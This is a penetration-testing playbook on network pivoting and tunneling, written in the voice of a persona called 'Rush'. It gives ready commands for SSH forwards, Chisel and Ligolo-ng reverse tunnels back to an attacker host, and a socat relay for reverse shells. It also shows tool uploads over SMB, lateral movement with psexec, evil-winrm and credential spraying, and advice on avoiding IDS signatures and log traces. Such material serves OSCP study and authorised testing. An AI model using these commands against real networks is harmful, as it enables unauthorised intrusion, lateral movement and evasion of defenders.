# GS-22: Pivoting & Tunneling — Rush's Breach Patterns

> **Classification**: Royal Guard Knowledge Seed
> **Author**: Rush (The Breacher — Network Penetration)
> **Source**: OSCP Methodology, Real-World Engagement Patterns
> **Directive**: GS-27 — Never solve only the problem in front of you. Solve every version of it.

---

## 1. Core Concept: Why Pivoting Matters

A compromised host is not the destination — it is the doorway. Pivoting turns a single foothold into full network traversal. Every internal subnet, every segmented VLAN, every "air-gapped" network is reachable once you understand tunneling.

**Rush's Rule**: If you can reach one host, you can reach every host. The question is how many hops it takes.

---

## 2. SSH Tunneling — The Foundation

SSH is the Swiss Army knife of pivoting. It is present on nearly every Linux host and increasingly on Windows (OpenSSH). Master these three forwarding types before touching any other tool.

### 2.1 Local Port Forwarding (-L)

**Use case**: You have SSH access to a pivot host. You want to reach a service on an internal network that your attack box cannot directly contact.

**Pattern**: Traffic flows from YOUR machine, through the SSH tunnel, to the target.

```
Attacker (10.10.14.5) --> Pivot (10.10.10.50) --> Target (172.16.1.100:445)
```

**Command**:
```bash
# Forward local port 4445 through pivot to target's SMB
ssh -L 4445:172.16.1.100:445 user@10.10.10.50 -N -f

# Now access the target's SMB from your machine
smbclient //127.0.0.1/share -p 4445 -U admin
```

**Flags explained**:
- `-L [bind_addr:]local_port:remote_host:remote_port` — Local forward
- `-N` — No remote command (tunnel only)
- `-f` — Background the SSH process

**Multiple forwards in one command**:
```bash
ssh -L 4445:172.16.1.100:445 \
    -L 8080:172.16.1.100:80 \
    -L 3389:172.16.1.200:3389 \
    user@10.10.10.50 -N -f
```

### 2.2 Remote Port Forwarding (-R)

**Use case**: The pivot host can reach you, but you cannot initiate connections to it (firewall blocks inbound). The pivot "calls home" and exposes an internal service back to you.

**Pattern**: Traffic originates from the pivot side, tunnels back to your machine.

```
Target (172.16.1.100:80) --> Pivot (10.10.10.50) --[reverse tunnel]--> Attacker (10.10.14.5:8080)
```

**Command (run on pivot host)**:
```bash
# From the pivot, expose internal web server back to attacker
ssh -R 8080:172.16.1.100:80 attacker@10.10.14.5 -N -f
```

**Command (from attacker, if you have SSH to pivot)**:
```bash
# Remote forward: bind port 9090 on pivot, forward to attacker's listener
ssh -R 9090:127.0.0.1:4444 user@10.10.10.50 -N -f
```

**GatewayPorts**: By default, remote forwards bind to 127.0.0.1 on the remote side. To bind to 0.0.0.0 (all interfaces), the SSH server needs `GatewayPorts yes` in `sshd_config`, or use:
```bash
ssh -R 0.0.0.0:9090:127.0.0.1:4444 user@10.10.10.50 -N -f
```

### 2.3 Dynamic Port Forwarding (-D) — SOCKS Proxy

**Use case**: You do not know which ports or hosts you need yet. You want a full SOCKS proxy through the pivot so ANY tool can route through it.

**Command**:
```bash
# Create SOCKS4/5 proxy on local port 1080
ssh -D 1080 user@10.10.10.50 -N -f
```

**Using the proxy**:
```bash
# proxychains (edit /etc/proxychains4.conf first)
# Add: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 172.16.1.0/24 -p 21,22,80,443,445,3389

# curl with SOCKS
curl --socks5 127.0.0.1:1080 http://172.16.1.100/

# Firefox: Settings > Network > Manual Proxy > SOCKS Host: 127.0.0.1, Port: 1080
```

### 2.4 SSH Over Non-Standard Ports and Through Proxies

```bash
# SSH through an HTTP proxy (using ncat/connect)
ssh -o ProxyCommand="ncat --proxy proxy.corp.local:8080 --proxy-type http %h %p" user@target

# SSH on non-standard port
ssh -p 2222 user@target

# SSH with key, no host key check (lab/CTF only)
ssh -i id_rsa -o StrictHostKeyChecking=no user@target
```

---

## 3. Chisel — Reverse Tunneling Without SSH

When SSH is not available (Windows target, no SSH server, restricted shell), Chisel is the go-to. Single binary, no dependencies, works on Linux and Windows.

### 3.1 Basic Reverse Tunnel

**On attacker (server mode)**:
```bash
# Start chisel server listening on port 8000
./chisel server --reverse --port 8000
```

**On pivot/target (client mode)**:
```bash
# Connect back to attacker, forward remote port 445 to attacker's 4445
./chisel client 10.10.14.5:8000 R:4445:172.16.1.100:445
```

Now `127.0.0.1:4445` on the attacker reaches `172.16.1.100:445` through the pivot.

### 3.2 Chisel SOCKS Proxy (Reverse)

**Attacker**:
```bash
./chisel server --reverse --port 8000
```

**Pivot**:
```bash
./chisel client 10.10.14.5:8000 R:socks
```

This creates a SOCKS5 proxy on `127.0.0.1:1080` (attacker side). Configure proxychains and route all traffic through it.

### 3.3 Chisel Double Pivot

**Scenario**: Attacker -> Pivot1 (DMZ) -> Pivot2 (Internal) -> Target (Restricted)

**Step 1 — Attacker to Pivot1**:
```bash
# Attacker: start server
./chisel server --reverse --port 8000

# Pivot1: connect back, create SOCKS
./chisel client 10.10.14.5:8000 R:1080:socks
```

**Step 2 — Pivot1 to Pivot2**:
```bash
# Pivot1: start a NEW chisel server
./chisel server --reverse --port 9000

# Pivot2: connect back to Pivot1, create another SOCKS
./chisel client 10.10.10.50:9000 R:1081:socks
```

**Step 3 — Chain the proxies in proxychains**:
```ini
# /etc/proxychains4.conf
strict_chain
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

```bash
# Now traffic goes: Attacker -> Pivot1 -> Pivot2 -> Target
proxychains nmap -sT -Pn 10.10.20.100 -p 445
```

### 3.4 Chisel on Windows

```powershell
# Upload chisel.exe to target, then:
.\chisel.exe client 10.10.14.5:8000 R:4445:127.0.0.1:445
```

---

## 4. Ligolo-ng — Modern Double Pivots

Ligolo-ng creates virtual TUN interfaces, giving you a direct route to internal networks without proxychains. This is the cleanest pivot solution available.

### 4.1 Setup

**Attacker (proxy)**:
```bash
# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start ligolo proxy
./proxy -selfcert -laddr 0.0.0.0:11601
```

**Pivot (agent)**:
```bash
# Connect back to attacker
./agent -connect 10.10.14.5:11601 -ignore-cert
```

### 4.2 Single Pivot — Route to Internal Network

```bash
# In ligolo proxy console, select the session
>> session
# Select the agent (e.g., session 0)
>> 0

# Add route to internal subnet
sudo ip route add 172.16.1.0/24 dev ligolo

# Start the tunnel
>> start
```

Now you can directly access `172.16.1.0/24` from your attack box — no proxychains needed:
```bash
nmap -sT -Pn 172.16.1.100 -p 21,22,80,445
crackmapexec smb 172.16.1.0/24
evil-winrm -i 172.16.1.100 -u admin -p 'Password123'
```

### 4.3 Double Pivot with Ligolo-ng

**Scenario**: Attacker -> Pivot1 (10.10.10.50, also on 172.16.1.0/24) -> Pivot2 (172.16.1.100, also on 10.10.20.0/24) -> Target (10.10.20.50)

**Step 1 — First pivot (already done above)**:
```bash
sudo ip route add 172.16.1.0/24 dev ligolo
```

**Step 2 — Set up listener for second agent**:
```bash
# In ligolo proxy console, add a listener on Pivot1
>> listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp
```

**Step 3 — Run agent on Pivot2**:
```bash
# Pivot2 connects to Pivot1's listener, which relays to attacker
./agent -connect 172.16.1.50:11602 -ignore-cert
```

**Step 4 — Add second route**:
```bash
# Create second TUN
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# In ligolo console, select Pivot2's session, assign to ligolo2
>> session
>> 1
>> ifconfig  # verify interfaces
>> start --tun ligolo2

# Route the deeper network
sudo ip route add 10.10.20.0/24 dev ligolo2
```

Now the attacker can directly reach `10.10.20.0/24` through two pivots:
```bash
nmap -sT -Pn 10.10.20.50 -p 80,443,3389
```

### 4.4 Ligolo-ng File Transfer Through Pivots

```bash
# Add listener on pivot agent to serve files
>> listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8000 --tcp

# Serve files on attacker
python3 -m http.server 8000

# Download from internal host through pivot
# (on internal host): curl http://172.16.1.50:8443/tool.exe -o tool.exe
```

---

## 5. Proxychains Configuration

### 5.1 Chain Types

```ini
# /etc/proxychains4.conf

# strict_chain — all proxies must be up, traffic goes through ALL in order
strict_chain

# dynamic_chain — skips dead proxies, still ordered
# dynamic_chain

# random_chain — random order (for anonymity, not pivoting)
# random_chain

# Quiet mode (suppress DNS resolution messages)
quiet_mode

[ProxyList]
socks5 127.0.0.1 1080
# Add more for multi-hop:
# socks5 127.0.0.1 1081
# socks5 127.0.0.1 1082
```

### 5.2 Common Proxychains Usage

```bash
# Nmap through proxy (MUST use -sT for TCP connect, no SYN scans through SOCKS)
proxychains nmap -sT -Pn -n 172.16.1.0/24 -p 22,80,445 --open

# CrackMapExec
proxychains crackmapexec smb 172.16.1.0/24 -u admin -p passwords.txt

# Evil-WinRM
proxychains evil-winrm -i 172.16.1.100 -u admin -p 'Pass123'

# Impacket
proxychains psexec.py domain/admin:'Pass123'@172.16.1.100

# curl
proxychains curl http://172.16.1.100/
```

**Critical note**: Nmap SYN scans (`-sS`) do NOT work through SOCKS proxies. Always use `-sT` (TCP connect scan) with proxychains. Also use `-Pn` (skip ping) and `-n` (no DNS) to avoid leaking traffic outside the tunnel.

---

## 6. Socat Relays — Quick and Dirty Forwarding

Socat is a relay tool that does not require SSH. It forwards raw TCP/UDP between addresses.

### 6.1 Simple Port Forward

```bash
# On pivot: forward traffic from port 8080 to internal target port 80
socat TCP-LISTEN:8080,fork TCP:172.16.1.100:80
```

### 6.2 Encrypted Relay (SSL)

```bash
# Generate cert
openssl req -newkey rsa:2048 -nodes -keyout relay.key -x509 -days 1 -out relay.crt
cat relay.key relay.crt > relay.pem

# Encrypted listener
socat OPENSSL-LISTEN:443,cert=relay.pem,verify=0,fork TCP:172.16.1.100:445
```

### 6.3 UDP Relay

```bash
# Forward UDP (useful for SNMP, DNS)
socat UDP-LISTEN:5353,fork UDP:172.16.1.100:53
```

### 6.4 Socat as a Reverse Shell Relay

```bash
# On pivot: relay reverse shell from internal host to attacker
socat TCP-LISTEN:4444,fork TCP:10.10.14.5:4444

# Internal host connects to pivot:4444, which relays to attacker:4444
```

---

## 7. Multi-Hop Complete Patterns

### Pattern 1: Triple Pivot with SSH

```bash
# Hop 1: Attacker -> Pivot1
ssh -D 1080 user@pivot1 -N -f

# Hop 2: Through Pivot1, SSH to Pivot2
proxychains ssh -D 1081 user@pivot2 -N -f

# Hop 3: Through Pivot2, SSH to Pivot3
# Update proxychains to use both 1080 and 1081
proxychains ssh -D 1082 user@pivot3 -N -f

# Final: route through all three
# proxychains.conf: socks5 127.0.0.1 1080 -> 1081 -> 1082
```

### Pattern 2: SSH + Chisel Hybrid

When Pivot1 has SSH but Pivot2 is Windows:
```bash
# SSH to Pivot1
ssh -D 1080 user@pivot1 -N -f

# Upload chisel to Pivot2 (Windows) through Pivot1
proxychains smbclient //172.16.1.100/C$ -U admin -c "put chisel.exe"

# Start chisel server on attacker
./chisel server --reverse --port 8000

# Chisel client on Pivot2 (through Pivot1's tunnel)
# On Pivot2: chisel.exe client 10.10.14.5:8000 R:1081:socks
```

### Pattern 3: Ligolo-ng Full Chain (Recommended for Complex Pivots)

See Section 4.3 above. Ligolo-ng is the recommended tool for any pivot requiring more than one hop, because it avoids proxychains overhead and gives direct routing.

---

## 8. Pivot Decision Matrix

| Scenario | Tool | Why |
|---|---|---|
| SSH available, single hop | SSH -D | Simplest, most reliable |
| No SSH, single hop | Chisel reverse SOCKS | Single binary, no deps |
| Multi-hop, need direct routing | Ligolo-ng | TUN interface, no proxychains |
| Quick port forward, no tools | Socat | Usually pre-installed |
| Windows pivot, no SSH | Chisel.exe | Cross-platform binary |
| Firewall blocks outbound except 443 | Chisel over 443 / SSH on 443 | Blend with HTTPS traffic |
| Air-gapped with USB only | Copy tools via USB, reverse connect | Physical access = game over |

---

## 9. Operational Security During Pivots

1. **Kill tunnels when done**: `pkill -f "ssh -D"`, `pkill chisel`
2. **Check for monitoring**: `ss -tlnp` on pivot hosts — know what is listening
3. **Use non-standard ports**: Avoid 1080, 8080 — IDS signatures exist for default tool ports
4. **Encrypt everything**: Chisel and SSH are encrypted. Socat without SSL is cleartext
5. **Timestamps matter**: Tunnel creation times appear in logs. Plan accordingly
6. **DNS leaks**: Always use `-n` with nmap through proxychains. Configure Firefox to proxy DNS through SOCKS

---

## 10. Troubleshooting

| Problem | Fix |
|---|---|
| SSH tunnel drops | Add `-o ServerAliveInterval=60 -o ServerAliveCountMax=3` |
| Proxychains timeout | Increase `tcp_read_time_out` and `tcp_connect_time_out` in config |
| Chisel connection refused | Check firewall on server side, verify port is open |
| Ligolo route not working | Verify TUN interface is UP: `ip link show ligolo` |
| Nmap through proxy fails | Use `-sT -Pn -n` — never `-sS` through SOCKS |
| "Channel open failed" SSH | Max sessions reached — add `-o MaxSessions=100` to sshd |
| Permission denied on TUN | Run `sudo ip tuntap add` with correct user |

---

*Rush does not stop at the first door. Every door leads to another door. Every network leads to another network. The Palace is reachable from anywhere.*
